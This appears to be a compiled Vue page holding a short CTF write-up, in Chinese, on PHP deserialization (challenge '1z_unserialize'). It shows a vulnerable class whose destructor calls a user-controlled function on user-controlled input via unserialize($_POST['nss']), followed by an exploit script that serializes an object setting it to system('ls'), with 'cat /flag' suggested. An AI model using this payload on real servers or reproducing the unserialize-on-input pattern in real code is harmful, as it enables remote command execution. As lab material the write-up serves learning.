import{_ as n,o as s,c as a,e as p}from"./app-bf957996.js";const e={},t=p(`<p>#PHP 序列化</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span>
<span class="token punctuation">{</span>
   <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;NSSCTF.com&#39;</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token punctuation">;</span>

   <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">{</span>
       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lt</span><span class="token punctuation">;</span>

       <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lly</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;nss&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;NSSCTF.com&#39;</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lyh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">-&gt;</span><span class="token property">lt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;system&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">-&gt;</span><span class="token property">lly</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;ls&#39;</span><span class="token punctuation">;</span>
<span class="token comment">//替换其他命令</span>
<span class="token comment">//cat /flag</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),l=[t];function i(c,o){return s(),a("div",null,l)}const r=n(e,[["render",i],["__file","1z_unserialize.html.vue"]]);export{r as default};
